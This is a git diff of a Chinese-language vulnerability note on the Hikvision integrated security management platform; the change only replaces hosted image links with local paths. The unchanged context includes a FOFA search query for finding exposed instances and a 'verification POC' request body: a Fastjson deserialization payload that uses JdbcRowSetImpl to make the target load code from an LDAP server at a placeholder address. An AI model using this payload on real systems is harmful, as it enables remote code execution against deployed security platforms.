@@ -20,7 +20,7 @@ app="HIKVISION-综合安防管理平台"
 
 登录页面
 
-![image-20220824134144287](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202208241341481.png)
+![image-20220824134144287](./images/202208241341481.png)
 
 验证POC
 
@@ -31,4 +31,4 @@ Content-Type: application/json
 {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xxx.xxx.xxx.xxx/Basic/TomcatEcho","autoCommit":true},"hfe4zyyzldp":"="}
 ```
 
-![image-20220824134503675](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202208241345726.png)
+![image-20220824134503675](./images/202208241345726.png)
